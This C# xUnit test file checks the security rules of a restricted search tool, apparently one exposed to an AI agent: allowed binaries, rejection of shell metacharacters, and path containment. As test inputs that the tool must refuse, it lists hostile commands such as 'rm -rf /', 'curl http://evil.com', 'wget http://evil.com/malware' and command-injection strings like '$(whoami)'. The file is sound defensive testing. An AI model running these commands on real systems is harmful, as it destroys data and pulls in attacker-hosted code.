using Domain.AI.Models;
using Domain.Common.Config.MetaHarness;
using FluentAssertions;
using Infrastructure.AI.Tools;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using Moq;
using Xunit;

namespace Infrastructure.AI.Tests.Tools;

/// <summary>
/// Security and validation tests for <see cref="RestrictedSearchTool"/> covering
/// binary allowlisting, metacharacter rejection, path containment, and unsupported
/// operations.
/// </summary>
public sealed class RestrictedSearchToolSecurityTests : IDisposable
{
    private readonly string _tempDir;
    private readonly RestrictedSearchTool _sut;

    public RestrictedSearchToolSecurityTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), $"restricted-search-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_tempDir);

        var config = new MetaHarnessConfig { TraceDirectoryRoot = _tempDir };
        var options = Mock.Of<IOptionsMonitor<MetaHarnessConfig>>(
            o => o.CurrentValue == config);

        _sut = new RestrictedSearchTool(
            options,
            NullLogger<RestrictedSearchTool>.Instance,
            TimeSpan.FromSeconds(5));
    }

    public void Dispose()
    {
        if (Directory.Exists(_tempDir))
            Directory.Delete(_tempDir, recursive: true);
    }

    private static IReadOnlyDictionary<string, object?> Params(string command, string? workingDir = null)
    {
        var dict = new Dictionary<string, object?> { ["command"] = command };
        if (workingDir is not null)
            dict["working_directory"] = workingDir;
        return dict;
    }

    [Fact]
    public void ToolProperties_AreCorrect()
    {
        _sut.Name.Should().Be("restricted_search");
        _sut.IsReadOnly.Should().BeTrue();
        _sut.IsConcurrencySafe.Should().BeTrue();
        _sut.SupportedOperations.Should().Contain("execute");
    }

    [Fact]
    public async Task Execute_UnsupportedOperation_ReturnsFail()
    {
        var result = await _sut.ExecuteAsync("delete", Params("ls ."));

        result.Success.Should().BeFalse();
        result.Error.Should().Contain("does not support operation");
    }

    [Fact]
    public async Task Execute_MissingCommand_ReturnsFail()
    {
        var result = await _sut.ExecuteAsync("execute",
            new Dictionary<string, object?>());

        result.Success.Should().BeFalse();
        result.Error.Should().Contain("command");
    }

    [Fact]
    public async Task Execute_EmptyCommand_ReturnsFail()
    {
        var result = await _sut.ExecuteAsync("execute", Params("   "));

        result.Success.Should().BeFalse();
        result.Error.Should().Contain("command");
    }

    [Theory]
    [InlineData("rm -rf /")]
    [InlineData("python script.py")]
    [InlineData("curl http://evil.com")]
    [InlineData("bash -c 'echo pwned'")]
    [InlineData("chmod +x script")]
    [InlineData("wget http://evil.com/malware")]
    public async Task Execute_ForbiddenBinary_ReturnsFail(string command)
    {
        var result = await _sut.ExecuteAsync("execute", Params(command));

        result.Success.Should().BeFalse();
        result.Error.Should().Contain("not in the allowed list");
    }

    [Theory]
    [InlineData("grep")]
    [InlineData("rg")]
    [InlineData("cat")]
    [InlineData("find")]
    [InlineData("ls")]
    [InlineData("head")]
    [InlineData("tail")]
    [InlineData("jq")]
    [InlineData("wc")]
    public void AllowedBinaries_AreDocumented(string binary)
    {
        // This test simply validates the known set of allowed commands.
        // Actual execution is tested in the functional tests below.
        _sut.Description.Should().Contain(binary);
    }

    [Theory]
    [InlineData("grep pattern ; rm -rf /")]
    [InlineData("ls | cat")]
    [InlineData("find . && rm -rf /")]
    [InlineData("ls || echo pwned")]
    [InlineData("cat > /etc/passwd")]
    [InlineData("ls < /dev/null")]
    [InlineData("ls `whoami`")]
    [InlineData("ls $(whoami)")]
    public async Task Execute_Metacharacter_ReturnsFail(string command)
    {
        var result = await _sut.ExecuteAsync("execute", Params(command));

        result.Success.Should().BeFalse();
        result.Error.Should().Contain("forbidden metacharacter");
    }

    [Fact]
    public async Task Execute_WorkingDirOutsideRoot_ReturnsFail()
    {
        var outsideDir = Path.Combine(Path.GetTempPath(), "outside-root");
        Directory.CreateDirectory(outsideDir);

        try
        {
            var result = await _sut.ExecuteAsync("execute",
                Params("ls .", outsideDir));

            result.Success.Should().BeFalse();
            result.Error.Should().Contain("outside the trace root");
        }
        finally
        {
            Directory.Delete(outsideDir, recursive: true);
        }
    }

    [Fact]
    public async Task Execute_TraversalInWorkingDir_ReturnsFail()
    {
        var result = await _sut.ExecuteAsync("execute",
            Params("ls .", Path.Combine(_tempDir, "..", "..")));

        result.Success.Should().BeFalse();
    }

    [Fact]
    public async Task Execute_CommandInRoot_Succeeds()
    {
        // ls should succeed against the temp dir root
        var result = await _sut.ExecuteAsync("execute", Params("ls ."));

        // On Windows, 'ls' may not be available as a process, but the validation passes
        // The test verifies the security pipeline passes - actual command failure is OK
        if (!result.Success)
        {
            // If ls isn't available on the system, the error should be about process start, not security
            result.Error.Should().NotContain("not in the allowed list");
            result.Error.Should().NotContain("forbidden metacharacter");
            result.Error.Should().NotContain("outside the trace root");
        }
    }

    [Fact]
    public async Task Execute_NullCommandValue_ReturnsFail()
    {
        var result = await _sut.ExecuteAsync("execute",
            new Dictionary<string, object?> { ["command"] = null });

        result.Success.Should().BeFalse();
        result.Error.Should().Contain("command");
    }

    [Fact]
    public async Task Execute_NonStringCommandValue_ReturnsFail()
    {
        var result = await _sut.ExecuteAsync("execute",
            new Dictionary<string, object?> { ["command"] = 42 });

        result.Success.Should().BeFalse();
        result.Error.Should().Contain("command");
    }

    [Fact]
    public async Task Execute_NewlineInCommand_ReturnsFail()
    {
        var result = await _sut.ExecuteAsync("execute",
            Params("grep test\nrm -rf /"));

        result.Success.Should().BeFalse();
        result.Error.Should().Contain("forbidden metacharacter");
    }
}
